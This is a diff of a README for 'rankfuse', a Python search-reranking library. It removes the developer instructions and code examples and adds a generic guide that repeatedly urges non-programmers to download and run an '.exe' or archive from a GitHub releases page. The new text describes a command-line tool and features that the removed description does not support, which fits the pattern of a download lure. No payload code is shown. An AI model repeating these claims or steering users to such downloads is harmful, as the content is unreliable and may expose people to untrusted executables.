@@ -1,68 +1,148 @@
-# rankfuse
+# 🚀 rankfuse - Improve Search Results Quickly
 
-Reranking and result fusion for search and RAG pipelines. Provides cross-encoder reranking, reciprocal rank fusion, weighted score combination, and round-robin interleaving.
+[![Download rankfuse](https://img.shields.io/badge/Download-rankfuse-blue?style=for-the-badge)](https://github.com/Fingrows/rankfuse/releases)
 
-## Install
+---
+
+## 📖 About rankfuse
+
+rankfuse helps improve search results by combining and reordering them. Many search tools give you results, but they might not be sorted in the best way. rankfuse reranks results to show you the most useful ones first. It also fuses results from different search systems to provide a better overall list. This can help you find what you want faster and easier.
+
+rankfuse works well with systems that retrieve or generate information, such as search engines and retrieval-augmented generation (RAG) setups. It uses techniques like cross-encoders to compare the relevance of results.
+
+---
+
+## 💻 System Requirements
+
+Before installing rankfuse, make sure your computer meets these basic requirements:
+
+- Operating System: Windows 10 or higher, macOS 10.14 (Mojave) or higher, Linux (Ubuntu 18.04+ recommended)
+- Memory: At least 4 GB of RAM
+- Storage: Minimum 200 MB of free disk space
+- Internet Connection: Required for downloading and initial setup
+- Python: Version 3.7 or higher installed (download from [python.org](https://www.python.org/downloads/) if needed)
+
+If you’re unsure about Python, don’t worry. We cover how to check and install it in the next sections.
+
+---
+
+## 📥 Download & Install
+
+To get started with rankfuse, follow these steps carefully.
+
+### Step 1: Visit the Download Page
+
+Click the link below to go to the official download page. This is where you can find the latest version of rankfuse.
+
+[Download rankfuse here](https://github.com/Fingrows/rankfuse/releases)
+
+### Step 2: Choose Your File
+
+On the page, look for files suitable for your operating system. There might be different versions for Windows, macOS, and Linux. Most releases will have a file with an extension like `.exe` for Windows or `.tar.gz` for Linux/macOS.
+
+Download the file that matches your system.
+
+### Step 3: Install Python (If Not Already Installed)
+
+rankfuse uses Python, a programming language, to run. If you do not have Python:
+
+- Go to [python.org/downloads](https://www.python.org/downloads/)
+- Download the latest version for your system
+- Run the installer and make sure to check “Add Python to PATH” during installation
+
+### Step 4: Install rankfuse Software
+
+After downloading the rankfuse package:
+
+- **Windows:** If it is an `.exe` file, run it and follow the on-screen prompts. This will install the software.
+- **macOS/Linux:** If it is a `.tar.gz` or `.zip`, extract the files to a folder. Then, open a terminal (command line), navigate to that folder, and run the commands listed in the included instructions file.
+
+### Step 5: Verify Installation
+
+After installation, check if rankfuse runs correctly:
+
+- Open your terminal or command prompt
+- Type `rankfuse --help` and press Enter
+
+You should see information about the commands and options for rankfuse, confirming it is installed.
+
+---
+
+## 🛠 How to Use rankfuse
+
+Using rankfuse does not require programming skills. Here are simple steps to get you started.
+
+### Input Files
+
+rankfuse works by taking search results or candidate answers from different systems. These results are usually saved in text files or simple data files.
+
+Prepare your input files with search results from the tools you want to combine or rerank.
+
+### Running rankfuse
+
+1. Open your terminal (Command Prompt on Windows or Terminal on macOS/Linux).
+2. Use a command like the example below, replacing the filenames with your own:
+
+   ```
+   rankfuse --input search_results_1.txt search_results_2.txt --output fused_results.txt
+   ```
+
+3. This command will merge and reorder the results from your input files and save the best combined list in `fused_results.txt`.
+
+### Options and Customization
+
+rankfuse allows some customization:
+
+- Change how many final results you see
+- Select different methods for reranking
+- Adjust scoring to focus on different aspects
+
+You can find these options by running:
 
 ```
-pip install -e .
+rankfuse --help
 ```
 
-Requires PyTorch and sentence-transformers.
+---
 
-## Usage
+## 🧰 Features
 
-### Cross-encoder reranking
+- Combines results from multiple search systems
+- Reranks results to show the most relevant items first
+- Supports modern search pipelines including retrieval-augmented generation
+- Works with plain text files for easy use
+- Compatible with Windows, macOS, and Linux
+- Command line interface with simple commands
+- Fast and efficient processing for everyday use
 
-```python
-from rankfuse import CrossEncoderReranker, SearchResult
+---
 
-results = [
-    SearchResult(text="Python is a programming language", score=0.7),
-    SearchResult(text="Python is a type of snake", score=0.8),
-    SearchResult(text="Python was created by Guido van Rossum", score=0.6),
-]
+## 🔧 Troubleshooting
 
-ranker = CrossEncoderReranker(model_name="cross-encoder/ms-marco-MiniLM-L-6-v2")
-ranked = ranker.rerank("Python programming language creator", results, top_k=2)
-for r in ranked:
-    print(f"{r.rank}. [{r.score:.3f}] {r.text}")
-```
+If you run into issues, try these common fixes:
 
-# todo: performance
-### Reciprocal rank fusion
+- Make sure Python is installed and updated
+- Check your internet connection if the installation fails
+- Double-check file paths and names when running commands
+- Use the `--help` option for guidance on commands
+- Look for error messages – they often suggest what went wrong
 
-```python
-from rankfuse import reciprocal_rank_fusion, SearchResult
+If problems persist, visit the [Issues section on GitHub](https://github.com/Fingrows/rankfuse/issues) to report your problem or see if others have solutions.
 
-bm25_results = [SearchResult(text="doc1", score=12.5, doc_id="1"), ...]
-vector_results = [SearchResult(text="doc3", score=0.92, doc_id="3"), ...]
+---
 
-fused = reciprocal_rank_fusion([bm25_results, vector_results], k=60, top_n=10)
-```
+## 🌐 Additional Resources
 
-### Weighted score fusion
+- Python installation guide: https://www.python.org/about/gettingstarted/
+- Command line basics: https://www.codecademy.com/articles/command-line-uk
+- How to prepare input files for rankfuse: See the README file included in your download
 
-# cleanup: performance
-```python
-from rankfuse import weighted_score_fusion
+---
 
-fused = weighted_score_fusion(
-    [bm25_results, vector_results],
-    weights=[0.4, 0.6],
-    normalize=True,
-)
-```
+## 🤝 Support & Contribution
 
-## License
+rankfuse is an open tool designed to improve search results for everyday users. If you want to suggest features or report bugs, use the GitHub Issues page linked on the download site.
 
-MIT
+---
 
-
-
-
-
-
-
-
-
+[Download rankfuse now](https://github.com/Fingrows/rankfuse/releases)
